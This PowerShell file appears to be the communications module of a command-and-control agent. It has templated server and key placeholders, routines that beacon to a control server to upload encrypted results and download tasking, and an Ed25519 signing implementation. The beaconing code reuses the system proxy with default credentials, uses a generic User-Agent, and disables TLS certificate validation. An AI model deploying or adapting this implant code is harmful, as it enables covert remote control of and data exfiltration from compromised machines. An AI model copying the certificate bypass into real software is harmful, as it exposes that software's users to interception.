# =========================
# comms.ps1  (ChaCha routing + AES/HMAC bodies + ED25519)
# =========================

$Script:server = "{{ host }}";
$Script:ControlServers = @($Script:server);
$Script:ServerIndex = 0;
$Script:Skbytes = [byte[]]@({{ agent_private_cert_key }})
$Script:pk = [byte[]]@({{ agent_public_cert_key }})
$Script:serverPubBytes = [byte[]]@({{ server_public_cert_key  }})

if($server.StartsWith('https')){
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
}

function Get-BytesFromKey($Key){
    if($Key -is [byte[]]){ return $Key }
    return [Text.Encoding]::UTF8.GetBytes([string]$Key)
}

function Get-StagingKeyBytes {
    if ($Script:StagingKeyBytes -is [byte[]] -and $Script:StagingKeyBytes.Length -gt 0){ return $Script:StagingKeyBytes }
    $skCandidate = if ($Script:StagingKey) { $Script:StagingKey } elseif ($SK) { $SK } else { '' }
    $Script:StagingKeyBytes = [Text.Encoding]::UTF8.GetBytes([string]$skCandidate)
    return $Script:StagingKeyBytes
}

function Get-SessionKeyBytes {
    if ($Script:SessionKey -is [byte[]]) { return $Script:SessionKey }
    $s = [string]$Script:SessionKey
    # If it's base64, decode; else use UTF-8 bytes
    try {
        if($s -and $s.Length -gt 0 -and ($s.TrimEnd('=')).Length % 4 -in 0,2,3){
            $raw = [Convert]::FromBase64String($s)  # will throw if not b64
            $Script:SessionKey = $raw
            return $raw
        }
    } catch { }
    $raw2 = [Text.Encoding]::UTF8.GetBytes($s)
    $Script:SessionKey = $raw2
    return $raw2
}

$Script:SendMessage = {
    param($Packets)

    if($Packets) {
        # Encrypt body with current SessionKey
        $EncBytes = Aes-EncryptThenHmac -Key $Script:SessionKey -Plain $Packets

        # Build ChaCha routing packet with STAGING key (not session key)
        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
            $wc = New-Object System.Net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
            if($Script:Proxy) { $wc.Proxy = $Script:Proxy }

            if(-not $Script:UserAgent){ $Script:UserAgent = 'Mozilla/5.0 (Windows NT; PowerShell Agent)' }
            $wc.Headers.Add('User-Agent', $Script:UserAgent)
            if($Script:Headers){
                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Add($_.Name, $_.Value) }
            }

            try {
                $taskURI = $Script:TaskURIs | Get-Random
                [void]$wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket)
            }
            catch [System.Net.WebException]{
                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                    # restart key negotiation
                    Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
                }
            }
        }
    }
};

$Script:GetTask = {
    try {
        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

            # Build empty-body routing cookie (meta 'TASKING_REQUEST' : 4)
            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

            $wc = New-Object System.Net.WebClient
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
            if($Script:Proxy) { $wc.Proxy = $Script:Proxy }

            if(-not $Script:UserAgent){ $Script:UserAgent = 'Mozilla/5.0 (Windows NT; PowerShell Agent)' }
            $wc.Headers.Add("User-Agent",$Script:UserAgent)
            if($Script:Headers){
                $Script:Headers.GetEnumerator() | ForEach-Object { $wc.Headers.Add($_.Name, $_.Value) }
            }
            $wc.Headers.Add("Cookie","{{ session_cookie }}=$RoutingCookie")

            $taskURI = $Script:TaskURIs | Get-Random
            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
            $result
        }
    }
    catch [Net.WebException] {
        $script:MissedCheckins += 1;
        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
            Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
        }
    }
};
# Requires .NET System.Numerics.BigInteger
Add-Type -AssemblyName System.Numerics

# Version (translate __version__)
$script:__version__ = "1.0.dev0"

# Constants as BigInteger
$script:bitLength = 256
[System.Numerics.BigInteger]$script:q = [System.Numerics.BigInteger]::Pow(2,255) - 19
[System.Numerics.BigInteger]$script:l = [System.Numerics.BigInteger]::Pow(2,252) + [System.Numerics.BigInteger]::Parse("27742317777372353535851937790883648493")

function Hash {
    param([byte[]]$m)
    $sha = [System.Security.Cryptography.SHA512]::Create()
    try { return $sha.ComputeHash($m) } finally { $sha.Dispose() }
}

# Helper to emulate Python's non-negative modulo
function ModQ([System.Numerics.BigInteger]$x) {
    $r = $x % $script:q
    if ($r -lt 0) { $r += $script:q }
    return $r
}

function pow2 {
    param([System.Numerics.BigInteger]$x, [int]$p)

    while ($p -gt 0) {
        $x = ModQ($x * $x)
        $p -= 1
    }
    return $x
}

function inv {
    param([System.Numerics.BigInteger]$z)

    # Adapted from curve25519_athlon.c in djb's Curve25519.
    $z2 = $z * $z % $script:q
    $z9 = (pow2 $z2 2) * $z % $script:q # 9
    $z11 = ModQ($z9 * $z2)  # 11
    $z2_5_0 = ModQ( (ModQ($z11 * $z11)) * $z9 )  # 31 == 2^5 - 2^0
    $z2_10_0 = ModQ( (pow2 $z2_5_0 5) * $z2_5_0 )  # 2^10 - 2^0
    $z2_20_0 = ModQ( (pow2 $z2_10_0 10) * $z2_10_0 )  # ...
    $z2_40_0 = ModQ( (pow2 $z2_20_0 20) * $z2_20_0 )
    $z2_50_0 = ModQ( (pow2 $z2_40_0 10) * $z2_10_0 )
    $z2_100_0 = ModQ( (pow2 $z2_50_0 50) * $z2_50_0 )
    $z2_200_0 = ModQ( (pow2 $z2_100_0 100) * $z2_100_0 )
    $z2_250_0 = ModQ( (pow2 $z2_200_0 50) * $z2_50_0 )  # 2^250 - 2^0
    return ModQ( (pow2 $z2_250_0 5) * $z11 )  # 2^255 - 2^5 + 11 = q - 2
}

# d and I
[System.Numerics.BigInteger]$script:d = ModQ( -121665 * (inv 121666) )
[System.Numerics.BigInteger]$script:I = [System.Numerics.BigInteger]::ModPow(2, (($script:q - 1) / 4), $script:q)

function xrecover {
    param([System.Numerics.BigInteger]$y)

    $xx = ($y * $y - 1) * (inv ($script:d * $y * $y + 1))
    $x  = [System.Numerics.BigInteger]::ModPow($xx, (($script:q + 3) / 8), $script:q)

    if ( (ModQ($x * $x - $xx)) -ne 0 ) {
        $x = ModQ($x * $script:I)
    }

    if ( ($x % 2) -ne 0 ) {
        $x = $script:q - $x
    }

    return $x
}

# Base point and identity
[System.Numerics.BigInteger]$By = ModQ( 4 * (inv 5) )
[System.Numerics.BigInteger]$Bx = xrecover $By
$script:basePoint = @(
    (ModQ($Bx)),
    (ModQ($By)),
    [System.Numerics.BigInteger]1,
    (ModQ($Bx * $By))
)
$script:ident = @([System.Numerics.BigInteger]0, [System.Numerics.BigInteger]1, [System.Numerics.BigInteger]1, [System.Numerics.BigInteger]0)

function edwards_add {
    param([object[]]$P, [object[]]$Q)
    # Formula sequence 'addition-add-2008-hwcd-3'

    $x1,$y1,$z1,$t1 = $P
    $x2,$y2,$z2,$t2 = $Q

    $a  = ModQ( ($y1 - $x1) * ($y2 - $x2) )
    $b  = ModQ( ($y1 + $x1) * ($y2 + $x2) )
    $c  = ModQ( $t1 * 2 * $script:d * $t2 )
    $dd = ModQ( $z1 * 2 * $z2 )
    $e  = ModQ( $b - $a )
    $f  = ModQ( $dd - $c )
    $g  = ModQ( $dd + $c )
    $h  = ModQ( $b + $a )
    $x3 = ModQ( $e * $f )
    $y3 = ModQ( $g * $h )
    $t3 = ModQ( $e * $h )
    $z3 = ModQ( $f * $g )

    return @($x3, $y3, $z3, $t3)
}

function edwards_double {
    param([object[]]$P)
    # Formula sequence 'dbl-2008-hwcd'
    $x1,$y1,$z1,$t1 = $P

    $a = ModQ($x1 * $x1)
    $b = ModQ($y1 * $y1)
    $c = ModQ(2 * $z1 * $z1)
    # dd = -a
    $e = ModQ( ($x1 + $y1) * ($x1 + $y1) - $a - $b )
    $g = ModQ( -$a + $b )  # dd + b
    $f = ModQ( $g - $c )
    $h = ModQ( -$a - $b )  # dd - b
    $x3 = ModQ( $e * $f )
    $y3 = ModQ( $g * $h )
    $t3 = ModQ( $e * $h )
    $z3 = ModQ( $f * $g )

    return @($x3, $y3, $z3, $t3)
}

function scalarmult {
    param([object[]]$P, [System.Numerics.BigInteger]$e)

    if ($e -eq 0) { return $script:ident }
    $half = [System.Numerics.BigInteger]::Divide($e, 2)
    $Q = scalarmult $P $half
    $Q = edwards_double $Q
    if ( ($e -band 1) -ne 0 ) {
        $Q = edwards_add $Q $P
    }
    return $Q
}

# basePointPow[i] == scalarmult(basePoint, 2**i)
$script:basePointPow = New-Object System.Collections.ArrayList

function make_basePointPow {
    $P = $script:basePoint
    for ($i = 0; $i -lt 253; $i++) {
        [void]$script:basePointPow.Add($P)
        $P = edwards_double $P
    }
}

make_basePointPow

function scalarmult_B {
    param([System.Numerics.BigInteger]$e)

    # scalarmult(basePoint, l) is the identity
    $e = $e % $script:l
    $P = $script:ident
    for ($i = 0; $i -lt 253; $i++) {
        if ( ($e -band 1) -ne 0 ) {
            $P = edwards_add $P $script:basePointPow[$i]
        }
        $e = [System.Numerics.BigInteger]::Divide($e, 2)
    }
    if ($e -ne 0) { throw $e }  # assert e == 0, e
    return ,$P
}

function encodeint {
    param([System.Numerics.BigInteger]$y)
    $bits = @()
    for ($i = 0; $i -lt $script:bitLength; $i++) {
        $bits += @([int](($y -shr $i) -band 1))
    }
    $out = New-Object byte[] ($script:bitLength / 8)
    for ($i = 0; $i -lt ($script:bitLength / 8); $i++) {
        $sum = 0
        for ($j = 0; $j -lt 8; $j++) {
            $sum += ($bits[$i * 8 + $j] -shl $j)
        }
        $out[$i] = [byte]$sum
    }
    return $out
}

function encodepoint {
    param([object[]]$P)
    $x,$y,$z,$t = $P
    $zi = inv $z
    $x = ModQ($x * $zi)
    $y = ModQ($y * $zi)
    $bits = @()
    for ($i = 0; $i -lt ($script:bitLength - 1); $i++) {
        $bits += @([int](($y -shr $i) -band 1))
    }
    $bits += @([int]($x -band 1))
    $out = New-Object byte[] ($script:bitLength / 8)
    for ($i = 0; $i -lt ($script:bitLength / 8); $i++) {
        $sum = 0
        for ($j = 0; $j -lt 8; $j++) {
            $sum += ($bits[$i * 8 + $j] -shl $j)
        }
        $out[$i] = [byte]$sum
    }
    return $out
}

function bit {
    param([byte[]]$h, [int]$i)
    $b = [int]$h[[int]([math]::Floor($i / 8))]
    $b = $b -band 0xFF
    return ($b -shr ($i % 8)) -band 1
}

function publickey_unsafe {
    param([byte[]]$sk)

    $h = Hash $sk
    [System.Numerics.BigInteger]$a = [System.Numerics.BigInteger]::Pow(2, ($script:bitLength - 2))
    for ($i = 3; $i -lt ($script:bitLength - 2); $i++) {
        $a += [System.Numerics.BigInteger]::Pow(2, $i) * (bit $h $i)
    }
    $A = scalarmult_B $a
    return (encodepoint $A)
}

function Hint {
    param([byte[]]$m)
    $h = Hash $m
    [System.Numerics.BigInteger]$s = 0
    for ($i = 0; $i -lt (2 * $script:bitLength); $i++) {
        $s += [System.Numerics.BigInteger]::Pow(2, $i) * (bit $h $i)
    }
    return ,$s
}

function signature_unsafe {
    param([byte[]]$m, [byte[]]$sk, [byte[]]$pk)

    $h = Hash $sk
    [System.Numerics.BigInteger]$a = [System.Numerics.BigInteger]::Pow(2, ($script:bitLength - 2))
    for ($i = 3; $i -lt ($script:bitLength - 2); $i++) {
        $a += [System.Numerics.BigInteger]::Pow(2, $i) * (bit $h $i)
    }
    # r = Hint(bytes([h[j] for j in range(bitLength // 8, bitLength // 4)]) + m)
    $sliceLen = [int]($script:bitLength / 4 - $script:bitLength / 8)
    $rBytes = New-Object byte[] $sliceLen
    [array]::Copy($h, [int]($script:bitLength / 8), $rBytes, 0, $sliceLen)
    $rm = New-Object System.IO.MemoryStream
    $bw = New-Object System.IO.BinaryWriter($rm)
    try {
        $bw.Write($rBytes)
        $bw.Write($m)
        $bw.Flush()
        $r = Hint ($rm.ToArray())
    } finally {
        $bw.Dispose(); $rm.Dispose()
    }

    $R2 = scalarmult_B $r
    $S = ( $r + (Hint ((encodepoint $R2) + $pk + $m)) * $a ) % $script:l
    return ( (encodepoint $R2) + (encodeint $S) )
}

function isoncurve {
    param([object[]]$P)
    $x,$y,$z,$t = $P
    return ( (ModQ($z) -ne 0) -and
             (ModQ($x * $y) -eq ModQ($z * $t)) -and
             ( ModQ($y * $y - $x * $x - $z * $z - $script:d * $t * $t) -eq 0 ) )
}

function decodeint {
    param([byte[]]$s)
    [System.Numerics.BigInteger]$r = 0
    for ($i = 0; $i -lt $script:bitLength; $i++) {
        $r += [System.Numerics.BigInteger]::Pow(2, $i) * (bit $s $i)
    }
    return $r
}

function decodepoint {
    param([byte[]]$s)
    [System.Numerics.BigInteger]$y = 0
    for ($i = 0; $i -lt ($script:bitLength - 1); $i++) {
        $y += [System.Numerics.BigInteger]::Pow(2, $i) * (bit $s $i)
    }
    $x = xrecover $y
    if ( ($x -band 1) -ne (bit $s ($script:bitLength - 1)) ) {
        $x = $script:q - $x
    }
    $P = @($x, $y, [System.Numerics.BigInteger]1, (ModQ ($x * $y)))
    if (-not (isoncurve $P)) {
        throw [System.Exception] "decoding point that is not on curve"
    }
    return $P
}

# Define SignatureMismatch exception class
class SignatureMismatch : System.Exception {
    SignatureMismatch([string]$message) : base($message) {}
}

function checkvalid {
    param([byte[]]$s, [byte[]]$m, [byte[]]$pk)

    if ($s.Length -ne ($script:bitLength / 4)) {
        throw [System.Exception] "signature length is wrong"
    }

    if ($pk.Length -ne ($script:bitLength / 8)) {
        throw [System.Exception] "public-key length is wrong"
    }

    # Fix array slicing - use proper range syntax
    $rByteLength = [int]($script:bitLength / 8)
    $totalSigLength = [int]($script:bitLength / 4)

    # Extract R bytes (first half of signature)
    $rBytes = New-Object byte[] $rByteLength
    [Array]::Copy($s, 0, $rBytes, 0, $rByteLength)

    # Extract S bytes (second half of signature)
    $sBytes = New-Object byte[] $rByteLength
    [Array]::Copy($s, $rByteLength, $sBytes, 0, $rByteLength)

    $R = decodepoint $rBytes
    $A = decodepoint $pk
    $Sint = decodeint $sBytes
    $h = Hint ( (encodepoint $R) + $pk + $m )

    $P = scalarmult_B $Sint
    $x1,$y1,$z1,$t1 = $P
    $temp = (scalarmult $A $h)
    $Qval = edwards_add $R $temp
    $x2,$y2,$z2,$t2 = $Qval

    # Check if points are on curve and if verification equation holds
    if ( (-not (isoncurve $P)) -or (-not (isoncurve $Qval)) ) {
        throw [SignatureMismatch]::new("Points are not on curve")
    }

    if ( (( ModQ($x1 * $z2 - $x2 * $z1)) -ne 0 ) -or
         (( ModQ($y1 * $z2 - $y2 * $z1)) -ne 0 ) ) {
        throw [SignatureMismatch]::new("signature does not pass verification")
    }

    return $true
}
